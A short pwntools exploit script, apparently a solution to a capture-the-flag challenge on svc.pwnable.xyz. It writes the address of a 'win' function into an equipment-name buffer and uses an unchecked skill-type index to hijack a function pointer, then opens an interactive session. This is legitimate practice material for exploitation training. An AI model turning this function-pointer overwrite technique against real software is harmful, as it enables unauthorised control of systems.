from pwn import *

e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30020)
win = e.symbols['win']
level = 0
SkillTable = 0x00000000006046E0
player_equip = 0x0000000000604288 + 0xd0 # player.Equip.Name

get = ['Which skill do you want to use : ','Do you want to change your equip (y/n)? : '
,'Do you want to change the type of your skills (y/n)? : ','Which skill do you want to change (3 to exit): ']
# log.info(a[-1])
while True:
	sleep(1)
	a=p.read().split('\n')[-1]
	log.info(a)
	if get[0] == a:
		p.sendline('1')
		p.sendlineafter('Which target you want to use that skill on :','0')
	elif get[1] == a:
		p.sendline('y')
		p.sendlineafter('Name for your equip: ',p64(win))
	elif get[2] == a:
		p.sendline('y')
		p.sendlineafter('Which skill do you want to change (3 to exit): ','1')
		p.sendlineafter('What type of skill is this (0: Heal, 1: Attack): ',str((player_equip-SkillTable)/8))
	elif get[3] == a:
		p.sendline('3')
		p.sendlineafter('Which skill do you want to use : ','1')
		p.sendlineafter('Which target you want to use that skill on :','0')
		p.interactive()

p.interactive()